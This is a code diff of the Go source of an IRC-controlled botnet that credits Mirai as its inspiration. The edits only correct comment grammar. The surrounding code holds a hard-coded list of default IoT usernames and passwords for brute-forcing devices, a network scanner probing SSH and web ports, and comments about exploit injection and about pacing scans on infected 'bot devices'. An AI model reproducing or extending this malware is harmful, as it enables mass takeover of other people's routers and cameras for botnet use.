@@ -19,8 +19,8 @@ var (
 	randomNet  string //0.0.0.0/0
 
 	/*
-		Thank you mirai for these usernames and passwords list (You are my inspirelation).
-		Add more usernames and passwords in to the slice name "userList" and "paswdList".
+		Thank you, Mirai for these usernames and passwords list (You are my inspiration).
+	 	Add more usernames and passwords to the slice name "userList" and "paswdList".
 	*/
 	userList  = []string{"admin", "root", "user", "guest", "support", "login", "zyfwp", "ZXDSL"}
 	paswdList = []string{"", "admin", "root", "user", "guest", "support", "login", "password", "default", "pass", "1234", "12345", "123456", "12345678", "123456789", "1234567890", "54321", "123123", "888888", "666666", "00000000", "1111", "111111", "1111111", "ikwb", "system", "juantech", "realtek", "smcadmin", "jiocentrum", "hslwificam", "cxlinux", "jvbzd", "ZXDSL", "vizxv", "xmhdipc", "zlxx", "hi3518", "admin1234", "Admin1234", "admin12345", "Admin12345", "1001chin", "klv123", "oelinux123", "klv1234", "xc3511", "Zte521", "7ujMko0admin", "7ujMko0vizxv", "PrOw!aN_fXp", "W!n0&oO7."}
@@ -260,7 +260,7 @@ func (b *Bot) setupScanner(scanNetwork []string, isRandom bool, nCores string) b
 
 			if rtnIP := b.checkPort(*ptrIP, "22"); rtnIP == "" {
 				/*
-					Non-checking on injection process of the exploit!!!
+					Non-checking on the injection process of the exploit!!!
 				*/
 				if b.checkPort(*ptrIP, "80") != "" || b.checkPort(*ptrIP, "8080") != "" {
 					b.tempIP = *ptrIP
@@ -318,11 +318,11 @@ func (b *Bot) Scanner() {
 		if value, key := ScanMap[setCall.CallBot.ScanOpt]; key {
 			/*
 				Full core scanning of a bot CPU
-				Create a concurrence following by numbers of core in CPU.
+				Create a concurrence followed by the number of cores in the CPU.
 
 				Why use core to scan instead of thread???
-				1) Because i need to be careful about overheat problem of a bot device even thread in Go are light weight.
-				2) For against excess flood on IRC server when bot device or server have more than 4 cores which is equal to core times 2 when using thread.
+				1) Because I need to be careful about the overheating problem of a bot device even threads in Go are light weight.
+				2) For against excess flood on IRC server when bot device or server has more than 4 cores which is equal to core times 2 when using thread.
 			*/
 			if b.CPU == 1 {
 				singleCore := "SINGLE CORE"
